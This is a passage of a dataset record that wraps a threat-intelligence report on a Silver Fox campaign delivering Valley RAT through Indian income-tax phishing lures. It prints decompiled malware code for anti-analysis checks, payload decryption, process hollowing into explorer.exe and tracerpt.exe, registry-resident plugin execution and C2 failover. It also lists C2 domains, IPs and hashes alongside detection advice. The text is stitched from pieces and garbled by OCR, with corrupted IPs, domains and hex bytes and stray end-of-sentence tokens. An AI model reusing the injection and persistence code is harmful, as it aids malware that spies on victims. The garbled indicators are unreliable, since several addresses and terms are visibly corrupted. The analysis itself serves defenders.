ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "wcscpy_s(&current_c2_addr,0xFFu,config_p3_tertiary_c2);wcscpy_s(&current_c2_port,0x1Eu,config_o3_tertiary_port);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "RegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - 